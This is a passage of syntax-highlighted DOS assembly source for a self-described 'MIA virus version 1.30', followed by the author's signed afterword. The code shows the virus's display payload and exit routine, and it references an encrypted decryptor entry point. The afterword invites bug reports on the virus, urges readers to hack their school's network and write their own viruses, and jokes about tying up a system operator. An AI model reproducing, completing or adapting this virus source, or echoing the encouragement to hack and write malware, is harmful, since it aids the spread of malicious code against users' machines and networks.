 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Remainder</span><span class="sc0">              </span><span class="sc1">; Jump if ZF=0 - remainder after dividing</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                 </span><span class="sc1">; Get current video mode</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; Return AL = video mode</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">cbw</span><span class="sc0">                           </span><span class="sc1">; Convert AL to AX</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; Set 80x25 screen and Clear it</span><span class="sc0">
 
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Move cursor</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Video page = zero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">               </span><span class="sc1">; DH = row, DL = column</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; INT 10h AH=01h, set cursor text-mode shape</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; CH = cursor start and option</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; "Hide the cursor"</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0B800h</span><span class="sc0">                 </span><span class="sc1">; Video mode 3 segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">      </span><span class="sc1">; Now display message</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0050h</span><span class="sc0">               </span><span class="sc1">; Number of characters to display</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                 </span><span class="sc1">; AL = Colours, upper 4-bit = background, </span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; lower 4-bit = foreground</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           

</span><span class="sc5">Disp</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">movsb</span><span class="sc0">                         </span><span class="sc1">; Character to display</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Attribute for the characters</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Disp</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; DS = ES = video mode 3 segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03DAh</span><span class="sc0">               </span><span class="sc1">; Port 03DAh = EGA/VGA colours status register</span><span class="sc0">

</span><span class="sc5">Rotate</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Traceback</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Traceback</span><span class="sc0">              </span><span class="sc1">; Waiting for retrace</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">; Move attributes &amp; characters</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">16h</span><span class="sc0">                    </span><span class="sc1">; Is there a key waiting in buffer?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Rotate</span><span class="sc0">                 </span><span class="sc1">; Nope, so loop</span><span class="sc0">

 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  </span><span class="sc1">; Erase characters</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0607h</span><span class="sc0">               </span><span class="sc1">; CL = bottom scan line </span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; Show cursor</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Previous mode is 3 ?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; DOS service AH=09h, display string at DS:DX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Videofit</span><span class="sc0">     </span><span class="sc1">; to standard output. string ended with '$'</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Ask</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; INT 16h (keyboard) service AH=00h, wait a</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">16h</span><span class="sc0">                    </span><span class="sc1">; keystroke from user. returns AH=BIOS scan </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; code, AL = ASCII character</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                 </span><span class="sc1">; Convert it to lowercase</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Eh</span><span class="sc0">                 </span><span class="sc1">; 'n' - No ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Answer</span><span class="sc0">                 
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; AL = 'N' or 'n'</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">29h</span><span class="sc0">                    </span><span class="sc1">; INT 29h = display single character in AL</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc5">Answer</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc0">                 </span><span class="sc1">; 'y' - Yes ?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Refresh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                 </span><span class="sc1">; Neither of 'em, so force user to press either</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">29h</span><span class="sc0">                    </span><span class="sc1">; Beep the speaker</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Ask</span><span class="sc0">              </span><span class="sc1">; and wait for a keystroke again</span><span class="sc0">

</span><span class="sc5">Refresh</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; Set video mode AL</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                 </span><span class="sc1">; Linefeed character</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">29h</span><span class="sc0">                    
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Carriage return</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">29h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">               </span><span class="sc1">; ES = current PSP segment</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">                          </span><span class="sc1">; Jump to PSP:0000h (INT 20h)</span><span class="sc0">

</span><span class="sc5">Message</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'               This is MIA virus version 1.30·, size:  000'</span><span class="sc0">
</span><span class="sc5">Virsize</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'0 bytes               '</span><span class="sc0">                     
</span><span class="sc5">Videofit</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Do You want to restore Your previous video mode (Y/N)? $'</span><span class="sc0">

</span><span class="sc5">EOF</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">Baby</span><span class="sc0"> </span><span class="sc9">EndS</span><span class="sc0">
     </span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0">             </span><span class="sc1">; End of a hard work, 8-)</span><span class="sc0">


















ˇ










 </span><span class="sc5">Well</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">well</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">well</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">uhm...</span><span class="sc0">  </span><span class="sc5">You</span><span class="sc13">'ve spent Your time reading the whole source...
</span><span class="sc0"> </span><span class="sc5">Hmmm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">did</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">line</span><span class="sc0"> </span><span class="sc5">per</span><span class="sc0"> </span><span class="sc5">line</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">am</span><span class="sc0"> </span><span class="sc5">dreadfully</span><span class="sc0"> </span><span class="sc5">sorry</span><span class="sc0">
 </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">did</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">bullshit</span><span class="sc4">*</span><span class="sc0">  </span><span class="sc5">maybe</span><span class="sc0"> </span><span class="sc5">tomorrow</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc13">'ll have to see an ophthalmologist
</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">buy</span><span class="sc0"> </span><span class="sc5">glasses</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">like</span><span class="sc0"> </span><span class="sc5">what</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">did</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc5">years</span><span class="sc0"> </span><span class="sc5">ago</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">-)</span><span class="sc0">

 </span><span class="sc5">Anyway</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">those</span><span class="sc0"> </span><span class="sc5">who</span><span class="sc13">'ve questions, rebuttals, bug reports (either the virus
</span><span class="sc0"> </span><span class="sc5">bug</span><span class="sc0"> </span><span class="sc5">itself</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">My</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">bad</span><span class="sc4">*</span><span class="sc0"> </span><span class="sc5">English</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">anything</span><span class="sc0"> </span><span class="sc5">positive</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">negative</span><span class="sc0"> </span><span class="sc5">concerning</span><span class="sc0">
 </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">please</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">e</span><span class="sc4">-</span><span class="sc5">mail</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">when</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">feel</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc13">'re gonna bust)  to:
</span><span class="sc0"> </span><span class="sc5">fulvian@usa.net</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0">  </span><span class="sc5">hope</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0">  </span><span class="sc5">much</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">reply</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">
 </span><span class="sc5">period</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc12">'t have My own internet connection  (really, I'</span><span class="sc5">m</span><span class="sc0">
 </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">son</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">poor</span><span class="sc0"> </span><span class="sc5">bitch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hex</span><span class="sc0">!</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">feel</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc6">not</span><span class="sc4">*</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">too</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0">
 </span><span class="sc5">don</span><span class="sc13">'t ever bother to force Your mom to  afford to pay Your local ISP for it,
</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">school</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">lab</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kick</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">SysOp</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">tie</span><span class="sc0"> </span><span class="sc5">Him</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
 </span><span class="sc5">tree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">muzzle</span><span class="sc0"> </span><span class="sc5">His</span><span class="sc0"> </span><span class="sc5">mouth</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">lay</span><span class="sc0"> </span><span class="sc5">Yourself</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">His</span><span class="sc0">  </span><span class="sc5">seat</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">launch</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">browser.</span><span class="sc0">
 </span><span class="sc5">easy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ain</span><span class="sc12">'t it? a little bit rude, right? but that'</span><span class="sc5">s</span><span class="sc0"> </span><span class="sc5">life</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">great</span><span class="sc0"> </span><span class="sc5">exertion</span><span class="sc0">!
 </span><span class="sc4">(</span><span class="sc5">sorry</span><span class="sc0"> </span><span class="sc5">again</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">joke</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t intend to teach You how to be a rapist.
</span><span class="sc0"> </span><span class="sc5">Just</span><span class="sc0"> </span><span class="sc5">learn</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">lesson</span><span class="sc0"> </span><span class="sc5">well</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">perhaps</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">no</span><span class="sc0"> </span><span class="sc5">longer</span><span class="sc0"> </span><span class="sc5">outta</span><span class="sc0"> </span><span class="sc5">job</span><span class="sc0">
 </span><span class="sc5">someday</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">those</span><span class="sc0"> </span><span class="sc5">whose</span><span class="sc0"> </span><span class="sc5">parents</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">rich</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">who</span><span class="sc13">'ve (legal) occupations
</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">wanna</span><span class="sc0"> </span><span class="sc5">tell</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">use</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">dream</span><span class="sc0"> </span><span class="sc5">machine</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">play</span><span class="sc0"> </span><span class="sc5">games</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">visiting</span><span class="sc0">
 </span><span class="sc5">homepages</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">PSPs</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Porn</span><span class="sc0"> </span><span class="sc5">Stuff</span><span class="sc0"> </span><span class="sc5">Providers</span><span class="sc4">),</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">bought</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0">
 </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">office</span><span class="sc0"> </span><span class="sc5">decoration</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">moan</span><span class="sc4">*)</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc5">Use</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">comp</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">kewl</span><span class="sc0"> </span><span class="sc5">things</span><span class="sc0">
 </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">instance</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hacking</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">school</span><span class="sc13">'s network or writing Your own
</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wow</span><span class="sc0">! </span><span class="sc1">;-D, he he he...</span><span class="sc0">

 </span><span class="sc5">Oohhhhh...</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">gotta</span><span class="sc0"> </span><span class="sc5">finish</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">writing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">My</span><span class="sc0"> </span><span class="sc5">HD</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">full</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">besides</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t wanna
</span><span class="sc0"> </span><span class="sc5">hurt</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">eyes</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">why</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">still</span><span class="sc0"> </span><span class="sc5">reading???</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0"> </span><span class="sc5">watch</span><span class="sc0"> </span><span class="sc5">Star</span><span class="sc0"> </span><span class="sc5">Wars</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">something</span><span class="sc0">
 </span><span class="sc5">essential</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc9">At</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">hope</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">My</span><span class="sc0"> </span><span class="sc5">big</span><span class="sc4">-</span><span class="sc5">sized</span><span class="sc0"> </span><span class="sc5">specs</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0"> </span><span class="sc5">hands</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">help</span><span class="sc0">
 </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">Windows</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">further</span><span class="sc0">  </span><span class="sc5">I</span><span class="sc13">'d love to reveal a
</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc0"> </span><span class="sc5">truth</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">guess</span><span class="sc0"> </span><span class="sc5">what?</span><span class="sc0"> </span><span class="sc5">uhm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc12">'s hard to say, but I don'</span><span class="sc5">t</span><span class="sc0"> </span><span class="sc5">wanna</span><span class="sc0"> </span><span class="sc5">make</span><span class="sc0"> </span><span class="sc5">anyone</span><span class="sc0">
 </span><span class="sc5">confused</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">misunderstanding</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">something</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">innermost</span><span class="sc0"> </span><span class="sc5">heart</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">something</span><span class="sc0">
